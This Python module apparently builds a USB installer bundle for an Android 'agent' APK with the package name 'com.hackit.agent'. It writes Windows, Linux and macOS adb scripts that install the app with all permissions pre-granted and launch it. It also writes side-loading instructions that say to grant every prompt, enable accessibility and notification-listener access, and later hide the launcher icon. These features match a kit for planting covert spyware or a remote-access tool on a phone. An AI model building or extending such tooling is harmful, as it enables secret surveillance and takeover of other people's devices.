"""Physical installer bundle: everything needed to install from a USB stick.

The bundle is a folder (plus a zip) that carries the APK, a Windows setup, a
POSIX setup, a macOS variant and a plain README. The scripts never phone home;
they only find an attached Android device through adb (or fail with the exact
reason) and install the APK that ships next to them.
"""
from __future__ import annotations

import os
import shutil
import time
from typing import List

README = """# {label} — offline installer ({spec})

Contents:
    agent.apk          the build for this host/PSK
    setup.bat          Windows: adb install (downloads platform-tools if missing)
    setup.sh           Linux:    adb install
    install.command    macOS:    adb install
    deploy.txt         commands for Android side-loading without a PC

The scripts are offline: they do not use the network. They look for `adb`
in PATH, then in `platform-tools/` next to this folder.
"""

SETUP_BAT = """@echo off
rem {label} installer ({spec})
setlocal
cd /d "%~dp0"
if not exist agent.apk (
  echo [!] agent.apk missing next to this script
  exit /b 1
)
set ADB=adb
where adb >nul 2>nul || if exist platform-tools\\adb.exe set ADB=platform-tools\\adb.exe
where adb >nul 2>nul || if exist "%ADB%" set ADB=%ADB%
where %ADB% >nul 2>nul || (
  echo [!] adb not found - put platform-tools next to this folder
  exit /b 1
)
%ADB% start-server
%ADB% devices | find /i "device" >nul || (
  echo [!] no device - enable USB debugging and plug the phone in
  exit /b 1
)
%ADB% install -r -g agent.apk
if errorlevel 1 exit /b 1
%ADB% shell am start -n {package}/.MainActivity
echo [i] done - grant the prompts on the phone screen
endlocal
"""

SETUP_SH = """#!/usr/bin/env sh
# {label} installer ({spec})
set -e
cd "$(dirname "$0")"
[ -f agent.apk ] || {{ echo "[!] agent.apk missing"; exit 1; }}
ADB=adb
command -v adb >/dev/null 2>&1 || [ -x platform-tools/adb ] && ADB=platform-tools/adb
command -v "$ADB" >/dev/null 2>&1 || {{ echo "[!] adb not found"; exit 1; }}
"$ADB" start-server
"$ADB" devices | grep -qw device || {{ echo "[!] no device attached"; exit 1; }}
"$ADB" install -r -g agent.apk
"$ADB" shell am start -n {package}/.MainActivity
echo "[i] done - grant the prompts on the phone screen"
"""

DEPLOY_TXT = """# Side-loading without a PC
1. Copy agent.apk to the phone (cable, share, or the carrier file trick).
2. Settings > Apps > Special access > Install unknown apps: allow the browser/file manager.
3. Open agent.apk, tap Install, then open "{label}" once.
4. On the setup page grant every prompt, then enable accessibility + notification listener.
5. Done - the launcher icon can be removed from the setup page later.
"""


def build(apk: str, directory: str, spec: str, label: str, package: str = "com.hackit.agent") -> List[str]:
    os.makedirs(directory, exist_ok=True)
    made: List[str] = []
    shutil.copy2(apk, os.path.join(directory, "agent.apk"))
    made.append(os.path.join(directory, "agent.apk"))

    def write(name: str, body: str, mode: int = 0o644) -> None:
        path = os.path.join(directory, name)
        with open(path, "w", encoding="utf-8") as handle:
            handle.write(body)
        if mode:
            os.chmod(path, mode)
        made.append(path)

    write("README.txt", README.format(label=label, spec=spec))
    write("setup.bat", SETUP_BAT.format(label=label, spec=spec, package=package))
    write("setup.sh", SETUP_SH.format(label=label, spec=spec, package=package), 0o755)
    write("install.command", SETUP_SH.format(label=label, spec=spec, package=package), 0o755)
    write("deploy.txt", DEPLOY_TXT.format(label=label))

    archive = shutil.make_archive(os.path.join(directory, f"{label}-{spec}-installer"), "zip", directory)
    made.append(archive)
    return made


def stamp() -> str:
    return time.strftime("%Y%m%d-%H%M%S")